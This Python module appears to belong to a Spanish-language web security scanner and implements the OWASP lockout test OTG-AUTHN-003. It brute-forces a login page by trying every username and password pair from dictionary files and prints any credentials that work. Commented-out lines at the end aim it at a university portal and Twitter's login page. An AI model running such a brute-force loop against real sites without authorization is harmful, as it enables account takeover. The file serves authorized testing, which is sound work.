#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from terceros.mechanicalsoup.utils import LinkNotFoundError
from terceros.loginform import fill_login_form
from src.lib.utilLogin import iniciarSesion
from src.lib.Form import Form
from src.lib.Inputs import CampoForm
from urllib.parse import urlparse
from fabrica.authn import Authn
import copy

class Authn_003(Authn):
    def __init__(self,url, path):
        self.url = url
        self.path = path
        self.usersDic = self.path + "/diccionarios/login/users.txt"
        self.passDic = self.path + "/diccionarios/login/passwords.txt"
        self.complejidad = 3

    def fuerzaBruta(self):
        b = None
        r = None 
        # Abrir el archivo de usuarios
        try:    
            with open(self.usersDic, 'r') as f:
                while True:
                    usuario = f.readline()
                    if usuario == "":
                        break
                    usuario = usuario[0:-1]

                    # Abrir el archivo de contraseñas
                    with open(self.passDic, 'r') as f2:
                        while True:
                            contraseña = f2.readline()
                            if contraseña == "":
                                break
                            contraseña = contraseña[0:-1]
                            #print("Probando con -> usuario: %s contraseña: %s" % (usuario, contraseña))
                            b, r = iniciarSesion(self.url, [usuario, contraseña])
                            if usuario in b.get_current_page().text:
                                print("Usuario: < %s > Contraseña: < %s >" % (usuario, contraseña))

        except (LinkNotFoundError, KeyboardInterrupt):
            print("\nLa aplicación tiene un mecanismo que bloquea ataques de fuerza bruta")
        finally:
            f2.close()
            f.close()
        b.close()

    def main(self):
        u = urlparse(self.url)
        self.url = u.scheme + "://" + u.netloc + u.path
        print("================ Inicio prueba OTG-AUTHN-003 ==================\n")
        self.fuerzaBruta()
        print("\n================ Fin prueba OTG-AUTHN-003 ==================\n")

#main("https://simca.unicauca.edu.co/simca/index.xhtml")
#main("https://twitter.com/login")
